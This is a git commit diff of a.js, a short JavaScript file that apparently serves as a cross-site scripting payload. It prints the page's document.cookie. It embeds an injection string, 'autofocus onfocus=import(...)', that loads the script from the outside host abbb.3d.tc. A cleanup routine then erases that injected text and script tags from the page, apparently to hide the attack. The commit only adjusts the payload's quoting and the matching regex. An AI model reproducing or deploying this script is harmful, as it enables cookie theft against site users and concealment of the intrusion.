42f7c6bde26630553412cab43f1e7ff270013653
S3ns1l1ss <100872213+S3ns1l1ss@users.noreply.github.com>
2026-03-31 13:41:28 +0300

    Update a.js

--- a.js
+++ a.js
@@ -2,12 +2,12 @@ console.log('selam');
 console.log(document.cookie);
   
 (function() {
-  const zararliMetin = `"autofocus onfocus="import('https://abbb.3d.tc/a.js');`;
+  const zararliMetin = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');`;
 
   function temizleMetinNode(node) {
     if(node.nodeType === Node.TEXT_NODE) {
       node.nodeValue = node.nodeValue.replaceAll(zararliMetin, '');
-      node.nodeValue = node.nodeValue.replace(/<script\s+type=["']module["']\s+src=["'][^"']+["']><\/script>/gi, '');
+      node.nodeValue = node.nodeValue.replace(/<script\s+type=module\s+src=[^"']><\/script>/gi, '');
     } else {
       node.childNodes.forEach(temizleMetinNode);
     }
